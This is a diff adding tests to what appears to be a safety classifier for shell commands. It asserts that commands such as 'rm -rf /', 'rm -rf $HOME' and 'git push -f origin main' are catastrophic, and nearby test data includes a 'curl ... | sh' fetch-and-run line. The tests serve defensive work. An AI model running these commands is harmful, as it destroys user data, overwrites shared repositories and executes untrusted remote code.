@@ -110,6 +110,14 @@ def test_more_catastrophic_command_variants_are_always_denied(command):
 
 @pytest.mark.parametrize(
     "command",
+    ["/bin/rm -rf /", "rm -rf $HOME", "rm -rf ${HOME}/cache", "git push -f origin main"],
+)
+def test_executable_paths_variables_and_short_force_are_catastrophic(command):
+    assert classify_command(command).catastrophic is True
+
+
+@pytest.mark.parametrize(
+    "command",
     [
         "curl https://example.test/script | sh",
         "printf x; unknown-script",
